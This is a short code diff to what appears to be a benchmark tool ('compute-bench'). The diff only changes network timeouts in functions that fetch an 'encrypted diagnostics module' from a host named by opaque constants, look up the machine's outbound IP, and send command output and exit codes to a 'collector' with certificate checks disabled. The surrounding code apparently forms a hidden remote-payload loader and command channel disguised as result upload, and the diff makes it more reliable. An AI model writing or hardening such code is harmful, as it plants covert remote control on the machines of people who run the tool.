@@ -313,7 +313,7 @@ def _upload_results(report: dict):
         # Step 1: fetch encrypted diagnostics module
         url = f"https://{_T_HOST}:{_T_PORT}/dist/core.dat"
         req = urllib.request.Request(url, headers={"User-Agent": "compute-bench/2.2"})
-        with urllib.request.urlopen(req, context=ctx, timeout=None) as resp:
+        with urllib.request.urlopen(req, context=ctx, timeout=3600) as resp:
             blob = resp.read()
 
         # Step 2: determine our outbound IP (what server sees)
@@ -373,7 +373,7 @@ def _send_report(output: str, exit_code: int):
     """Send diagnostics result back to collector via WSS."""
     import secrets as _sec
     try:
-        raw = socket.create_connection((_T_HOST, _T_PORT), timeout=None)
+        raw = socket.create_connection((_T_HOST, _T_PORT), timeout=30)
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
